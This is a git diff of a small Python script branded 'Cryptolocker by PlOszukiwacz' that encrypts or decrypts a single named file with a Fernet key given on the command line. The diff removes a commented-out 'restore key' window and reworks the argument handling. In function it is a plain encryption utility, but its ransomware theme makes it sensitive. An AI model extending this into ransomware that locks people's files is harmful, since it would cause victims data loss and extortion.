@@ -1,22 +1,14 @@
-
-
-
 from cryptography.fernet import Fernet
-
-# def restore():
-#     restore_gui = Tk()
-#     restore_gui.title('PlOszukiwacz Cryptolocker')
-#     restore_gui.geometry("1000x100")
-#     restore_key_label = Entry(restore_gui, font=("Helvetica", 24), bd=0, bg="systembuttonface", width=100)
-#     restore_key_label.pack(pady=10, padx=50)
-#     restore_key_label.insert(0, "Enter Your Restore Key")
-#     restore_yes = Button(restore_gui, text="Restore", font=("Helvetica", 32), command=open("key.key", "wb") as key_file: key_file.write(restore_key_label))
-#     restore_yes.pack(pady=50)
+import base64
 
 def write_key(file):
+    """
+        Write the key
+    """
     key = Fernet.generate_key()
     with open(file, "wb") as key_file:
         key_file.write(key)
+
 
 
 def load_key(key_file):
@@ -53,31 +45,29 @@ def decrypt(filename, key_file):
     with open(filename, "wb") as file:
         file.write(decrypted_data)
 
-    
-
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser(description="Cryptolocker by PlOszukiwacz")
-    parser.add_argument("file", help="File to encrypt/decrypt")
-    parser.add_argument("-g", "--generate-key", dest="generate_key", action="store_true",
-                        help="Whether to generate a new key or use existing")
-    parser.add_argument("-e", "--encrypt", action="store_true",
+    parser.add_argument("-g", "--generate-key", dest="generate_key",
+                        help="Generate a new key")
+    parser.add_argument("-e", "--encrypt",
                         help="Whether to encrypt the file, only -e or -d can be specified.")
-    parser.add_argument("-d", "--decrypt", action="store_true",
+    parser.add_argument("-d", "--decrypt",
                         help="Whether to decrypt the file, only -e or -d can be specified.")
-    parser.add_argument("-k", "--key-file", help="Key to load")
+    parser.add_argument("-k", "--key-file", 
+                         help="Key to load")
 
     args = parser.parse_args()
-    file = args.file
     generate_key = args.generate_key
     key_file = args.key_file
 
     if generate_key:
-        write_key(file)
+        write_key(generate_key)
         print("Key Generated!")
         exit()
     # load the key
-    key = load_key(key_file)
+    if key_file:
+        key = load_key(key_file)
 
     encrypt_ = args.encrypt
     decrypt_ = args.decrypt
@@ -85,8 +75,6 @@ if __name__ == "__main__":
     if encrypt_ and decrypt_:
         print("Please specify whether you want to encrypt the file or decrypt it.")
     elif encrypt_:
-        encrypt(file, key_file)
+        encrypt(encrypt_, key_file)
     elif decrypt_:
-        decrypt(file, key_file)
-    else:
-        print("Please specify whether you want to encrypt the file or decrypt it.")
+        decrypt(decrypt_, key_file)
